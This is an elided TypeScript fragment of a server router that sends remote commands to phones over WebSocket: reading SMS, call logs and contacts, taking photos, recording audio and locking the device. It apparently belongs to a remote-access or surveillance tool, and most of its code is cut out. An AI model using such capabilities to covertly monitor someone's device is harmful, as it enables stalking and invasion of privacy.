...
export const communicationsRouter = router({
  ...
  getSMS: protectedProcedure
    ...
    .query(async ({ input }) => {
      ...
      wsManager.broadcastToDevice(input.deviceId, "get-sms", {
        payload: {}
      });
  ...
  getCalls: protectedProcedure
    ...
    .query(async ({ input }) => {
      ...
      wsManager.broadcastToDevice(input.deviceId, "get-calls", {
        payload: {}
      });
  ...
  getContacts: protectedProcedure
    ...
    .query(async ({ input }) => {
      ...
      wsManager.broadcastToDevice(input.deviceId, "get-contacts", {
        payload: {}
      });
  ...
  triggerCamera: protectedProcedure
    ...
    .mutation(async ({ input }) => {
      ...
      const wsManager = getWebSocketManager();
      if (!wsManager) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "WebSocket no disponible" });
      wsManager.broadcastToDevice(input.deviceId, "take-photo", {
  ...
  vibrate: protectedProcedure
    ...
    .mutation(async ({ input }) => {
      ...
      const wsManager = getWebSocketManager();
      if (!wsManager) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "WebSocket no disponible" });
      wsManager.broadcastToDevice(input.deviceId, "vibrate", {
  ...
  lockDevice: protectedProcedure
    ...
    .mutation(async ({ input }) => {
      ...
      const wsManager = getWebSocketManager();
      if (!wsManager) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "WebSocket no disponible" });
      wsManager.broadcastToDevice(input.deviceId, "lock-device", {
        payload: {}
      });
      return { success: true, timestamp: new Date() };
    }),
  ...
  recordMicrophone: protectedProcedure
    ...
    .mutation(async ({ input }) => {
      ...
      const wsManager = getWebSocketManager();
      if (!wsManager) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "WebSocket no disponible" });
      wsManager.broadcastToDevice(input.deviceId, "record-audio", {
